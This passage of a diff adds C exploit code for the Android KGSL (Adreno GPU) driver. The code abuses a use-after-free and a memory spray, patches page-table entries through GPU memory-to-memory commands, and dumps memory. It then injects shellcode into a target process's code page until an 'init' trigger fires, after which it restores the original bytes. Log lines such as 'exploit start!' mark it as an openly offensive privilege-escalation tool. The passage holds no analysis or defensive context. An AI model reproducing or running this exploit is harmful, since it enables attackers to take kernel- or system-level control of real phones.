+                    if(ioctl(fd,IOCTL_KGSL_GPU_COMMAND, &c)==0 && wait_timestamp(fd,ctx_id2,c.timestamp) == 0 ) {
+                        fprintf(stderr,"        [*] Patched PTE PFN From 0x130 -> 0x0 for VA 0x%llx (orig PFN 0x%llx, pte1 PFN 0x%llx, src PFN 0x%llx copied PFN bits 0x%llx)\n",
+                            (unsigned long long)va,
+                            (unsigned long long)orig_pfn,
+                            (unsigned long long)pte1_pfn,
+                            (unsigned long long)src_pfn,
+                            (unsigned long long)copied_pfn);
+
+                    } 
+                    else {
+                        fprintf(stderr,
+                                "        [!] GPU patch (write stage) failed for VA 0x%llx\n",
+                                (unsigned long long)va);
+                    }
+                    memset(ib_vma2,0,ib_alloc.mmapsize);
+                    dw = 0;
+                    cmd = (uint32_t * )ib_vma2;
+                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
+                    for (int i_dump = 0; i_dump < 0x80; i_dump++){
+                        split64(dump_gpu +(uint64_t)i_dump *4, &d_lo, &d_hi);
+                        split64(va+(uint64_t)i_dump *4, &s_lo, &s_hi);
+                        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM,5);
+                        cmd[dw++] = 0;
+                        cmd[dw++]= d_lo;
+                        cmd[dw++] = d_hi;
+                        cmd[dw++] = s_lo;
+                        cmd[dw++] = s_hi;
+                        
+                    }
+                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
+                    bytes = (size_t) dw * 4;
+                    msync(ib_vma2, bytes, MS_SYNC);
+                    
+                    obj.size = bytes;
+                    memset(&c, 0 ,sizeof(c));
+                    c.cmdlist = (uint64_t) (uintptr_t) & obj;
+                    c.cmdsize = sizeof(obj);
+                    c.numcmds = 1;
+                    c.context_id = ctx_id2;
+
+                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) ==0 && wait_timestamp(fd,ctx_id2, c.timestamp)==0){
+                        msync(dump_vma, 0x200, MS_SYNC | MS_INVALIDATE);
+                        write(fd2,dump_vma,0x200);
+                    }
+                    fprintf(stderr, "everything over\n");
+                    uint64_t orig_pte_slot = *(uint64_t *)(gbuf + 0xb10 + ri * 24);
+                    uint64_t pte1_slot = *(uint64_t *)(gbuf + 0xb18 + ri * 24);
+                    fprintf(stderr,
+                            "orig pte 0x%llx, pte1 0x%llx ",
+                            (unsigned long long)orig_pte_slot,
+                            (unsigned long long)pte1_slot);
+
+
+
+
+                }
+                
+                if (dump_vma) {
+                    munmap(dump_vma, dump_alloc.mmapsize);
+
+                }
+                if(dump_id){
+                    struct kgsl_gpuobj_free fr_dump = {0};
+                    fr_dump.id = dump_id;
+                    ioctl(fd,IOCTL_KGSL_GPUOBJ_FREE,&fr_dump);
+                }
+                munmap(ib_vma2,ib_alloc.mmapsize);
+                
+            }
+            else{
+                fprintf(stderr,"alloc vma2");
+            }
+            
+            struct kgsl_gpuobj_free fr = {0};
+            fr.id = ib_id2;
+            ioctl(fd,IOCTL_KGSL_GPUOBJ_FREE,&fr);
+            
+        }
+        else{
+            fprintf(stderr,"ibALLOC\n");
+        }
+        
+    }
+    else{
+        fprintf(stderr,"IOCTL_KGSL_DRAWCTXT_CREATE");
+    }
+    
+    fprintf(stderr, "done!@#!@#\n");
+    write(fd2,(void *)(gb_target_addr+0x1000),0x1000);
+
+    fprintf(stderr, "exploit start!\n");
+    waitpid(*(uint64_t *)&gbuf[TARGET_PIDPID],NULL, 0);
+    int still = 0;
+    for (int i = 0; i < spray_count; i++) {
+        pid_t p = spray_ctrl[i].pid;
+        if (p <= 0) continue;
+        if (kill(p, 0) == 0) {
+            still++;
+            fprintf(stderr, "[!] pid still exists=%d\n", p);
+        }
+    }
+    fprintf(stderr, "[*] spray exists count=%d\n", still);
+
+    int nice_idx=-1;
+    int fd_recover = open("/data/local/tmp/recover",O_RDWR | O_CREAT | O_TRUNC,0777);
+    write(fd_recover,(void *)(*(uint64_t *)&gbuf[0x400]+0x162d4),287);
+    lseek(fd_recover,0,SEEK_SET);
+    uint64_t first= *(uint64_t *)(gb_target_addr+PAGE_SIZE + 0x2d4);
+
+
+    fprintf(stderr, "first 8 : %lx\n",first);
+    fprintf(stderr,"protect success\n");
+    
+    
+    if (first==0xd102c3ffd503233f){
+        lseek(fd_shellcode,0,SEEK_SET);
+        
+        if (read(fd_shellcode,(void *)(gb_target_addr+PAGE_SIZE + 0x2d4),287)<=0){
+            fprintf(stderr,"read not success\n");
+            perror("read");
+        }
+        //flush_icache((void *)(gb_target_addr+PAGE_SIZE+0x2d4),(size_t)287);
+        fprintf(stderr,"read success\n");
+        fprintf(stderr, "second 8 : %lx\n",*(uint64_t *)(gb_target_addr+PAGE_SIZE + 0x2d4));
+    }
+    if (first==0xd102c3ffd503233f){
+        fprintf(stderr,"nice job\n");
+    }        
+
+
+    
+    
+    gbuf[FOUND_PID]=0x11;
+    waitpid(pid, NULL, 0); 
+    
+    
+    while(1){
+
+        
+
+        if (gbuf[CALL_LOGLINE]==0x11){
+            fprintf(stderr,"[+] TRIGGERED! Holding init...\n");
+            
+            break;
+        }
+        usleep(500);
+    }
+
+    usleep(500000);
+
+    ssize_t recover_len = read(fd_recover,(void *)(gb_target_addr+PAGE_SIZE+0x2d4),287);
+    //flush_icache((void *)(gb_target_addr+PAGE_SIZE+0x2d4),(size_t)recover_len);
+    recover_origin(fd);
+
+    
+    sleep(1);
+    struct kgsl_gpuobj_free free_req = {0};
+
+
+    if (ph_id) {
+        free_req.id = ph_id;
+        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
+            perror("cleanup: free ph_id"); 
+        } else {
+            fprintf(stderr, "    [+] Freed Placeholder ID %u\n", ph_id);
+        }
+        ph_id = 0;
+    }
+    
+
+    if (overlap_id) {
+        free_req.id = overlap_id;
+        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
+            perror("cleanup: free overlap_id");
+        } else {
+            fprintf(stderr, "    [+] Freed Overlap ID %u\n", overlap_id);
+        }
+        overlap_id = 0;
+    }
+    
+    if (uaf_id) {
+        free_req.id = uaf_id;
+        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
+            perror("cleanup: free uaf_id");
+        } else {
+            fprintf(stderr, "    [+] Freed UAF ID %u\n", uaf_id);
+        }
+        uaf_id = 0;
+    }
+    
+
+
+    if (overlap_vma && overlap_vma != MAP_FAILED) {
+        munmap(overlap_vma, overlap_mmapsize);
+    }
+    if (ph_vma && ph_vma != MAP_FAILED) {
+        munmap(ph_vma, ph_mmapsize);
+    }
+    if (bogus_vma && bogus_vma != MAP_FAILED) {
+        munmap(bogus_vma, PAGE_SIZE * 3);
+    }
+    close(fd_zero);
+    close(fd2);
+    close(fd_lib);
+    close(fd_shellcode);
+    close(fd);
+    usleep(100);
+    mmap_spray_free();
     return 0;
+
 }
